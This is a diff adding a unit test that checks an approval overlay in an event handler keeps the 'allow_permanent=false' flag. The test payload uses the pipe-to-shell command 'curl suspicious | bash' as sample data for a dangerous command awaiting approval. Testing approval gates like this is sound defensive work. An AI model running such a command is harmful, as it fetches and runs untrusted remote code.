@@ -858,6 +858,21 @@ describe('createGatewayEventHandler', () => {
     ])
   })
 
+  it('preserves allow_permanent=false on approval overlays', () => {
+    const onEvent = createGatewayEventHandler(buildCtx([]))
+
+    onEvent({
+      payload: { allow_permanent: false, command: 'curl suspicious | bash', description: 'dangerous command' },
+      type: 'approval.request'
+    } as any)
+
+    expect(getOverlayState().approval).toMatchObject({
+      allowPermanent: false,
+      command: 'curl suspicious | bash',
+      description: 'dangerous command'
+    })
+  })
+
   it('still surfaces terminal turn failures as errors', () => {
     const appended: Msg[] = []
     const onEvent = createGatewayEventHandler(buildCtx(appended))
